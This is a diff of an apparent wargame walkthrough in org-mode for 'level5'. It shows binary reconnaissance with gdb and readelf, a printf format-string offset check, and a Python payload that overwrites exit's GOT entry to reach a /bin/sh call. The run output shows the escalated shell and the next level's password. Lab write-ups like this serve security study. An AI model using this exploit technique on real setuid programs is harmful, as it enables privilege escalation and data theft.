@@ -1,6 +1,71 @@
 #+title: Walkthrough
 * Data Gathering
+** Strings
+#+begin_src shell :tangle no
+readelf -p.rodata $USER
 
+String dump of section '.rodata':
+  [     8]  /bin/sh
+#+end_src
+** Functions
+#+begin_src shell :tangle no
+gdb ./$USER -batch -ex "info functions" -ex "info variables"
+All defined functions:
+
+Non-debugging symbols:
+0x08048334  _init
+0x08048380  printf
+0x08048380  printf@plt
+0x08048390  _exit
+0x08048390  _exit@plt
+0x080483a0  fgets
+0x080483a0  fgets@plt
+0x080483b0  system
+0x080483b0  system@plt
+0x080483c0  __gmon_start__
+0x080483c0  __gmon_start__@plt
+0x080483d0  exit
+0x080483d0  exit@plt
+0x080483e0  __libc_start_main
+0x080483e0  __libc_start_main@plt
+0x080483f0  _start
+0x08048420  __do_global_dtors_aux
+0x08048480  frame_dummy
+0x080484a4  o # Custom one
+0x080484c2  n # Custom one
+0x08048504  main # Custom one
+0x08048520  __libc_csu_init
+0x08048590  __libc_csu_fini
+0x08048592  __i686.get_pc_thunk.bx
+0x080485a0  __do_global_ctors_aux
+0x080485cc  _fini
+#+end_src
+** Globals vars
+#+begin_src shell :tangle no
+All defined variables:
+
+Non-debugging symbols:
+0x080485e8  _fp_hw
+0x080485ec  _IO_stdin_used
+0x08048734  __FRAME_END__
+0x08049738  __CTOR_LIST__
+0x08049738  __init_array_end
+0x08049738  __init_array_start
+0x0804973c  __CTOR_END__
+0x08049740  __DTOR_LIST__
+0x08049744  __DTOR_END__
+0x08049748  __JCR_END__
+0x08049748  __JCR_LIST__
+0x0804974c  _DYNAMIC
+0x08049818  _GLOBAL_OFFSET_TABLE_
+0x08049840  __data_start
+0x08049840  data_start
+0x08049844  __dso_handle
+0x08049848  stdin@@GLIBC_2.0
+0x0804984c  completed.6159
+0x08049850  dtor_idx.6161
+0x08049854  m # Interesting one
+#+end_src
 * Binary Analisis
 ** Functions 
 #+begin_src shell
@@ -17,7 +82,7 @@ Dump of assembler code for function n:
    0x080484c2 <+0>:	push   ebp
    0x080484c3 <+1>:	mov    ebp,esp
    0x080484c5 <+3>:	sub    esp,0x218
-   0x080484cb <+9>:	mov    eax,ds:0x8049848
+   0x080484cb <+9>:	mov    eax,ds:0x8049848 # stdin
    0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
    0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
    0x080484dc <+26>:	lea    eax,[ebp-0x208]
@@ -39,5 +104,70 @@ Dump of assembler code for function o:
    0x080484bd <+25>:	call   0x8048390 <_exit@plt>
 End of assembler dump.
 #+end_src
+** Source
+[[source]]
+** Get offset.
+#+begin_src shell
+ gdb ./$USER -q -ex "set disassembly-flavor intel" -ex "set pagination off"
+Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
 
+(gdb) b printf
+Breakpoint 1 at 0x8048380
+(gdb) r
+Starting program: /home/user/level5/level5 
+BBBB%p%p%p%p%p%p%p%p%p
+Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
+#+end_src
+*** Verification
+offset at 4.
+#+begin_src shell
+BBBB%4$p # B = 42 in decimal.
+BBBB0x42424242
+#+end_src
+** Explotation idea
+#+begin_quote
+Change the exit.plt.got to the begin of 'o' function.
+#+end_quote
+*** Get data for exploit
+****  Get exit@got.plt
+#+begin_src shell
+b main
+r 
+p exit
+$2 = {<text variable, no debug info>} 0x80483d0 <exit@plt>
+(gdb) x/10b 0x80483d0
+   0x80483d0 <exit@plt>:	jmp    *0x8049838
+x/10i 0x8049838
+   0x8049838 <exit@got.plt>:	(bad)  
+   0x8049839 <exit@got.plt+1>:	addl   $0xffffffe6,(%eax,%ecx,1)
+
+#+end_src
+**** Get data
+#+begin_src shell
+got_exit=0x8049838
+offset=4.
+va_o=0x80484a4
+x080484a4 -> 134513924
+p  0x080484a4 >> 16
+va_o_h= 2052
+p 0x80484a4 & 0xffff
+va_o_l = 33956
+p  (0x080484a4 & 0xffff) - (0x080484a4 >> 16)
+va_o_diff = 31904
+
+#+end_src
+*** Explotation String
+**** Better split in two halves.
+# ptr |          |                                                                                                                   2                  *  4
+~"va_exit_got.plt_l"+"va_exit_got.plt_h" + "%'va_o_h-(sizeof(short int *)  * 2)'d%4$hn%'va_o_diff'd%5$hn"~
+#+begin_src shell
+python -c 'print "\x08\x04\x98\x3c"[::-1] + "\x08\x04\x98\x38"[::-1] + "%2044d%4$hn%31904d%5$hn"' > /tmp/$USER
+#+end_src
 * Explotation
+#+begin_src shell
+cat /tmp/$USER - | ./$USER
+id
+uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+#+end_src
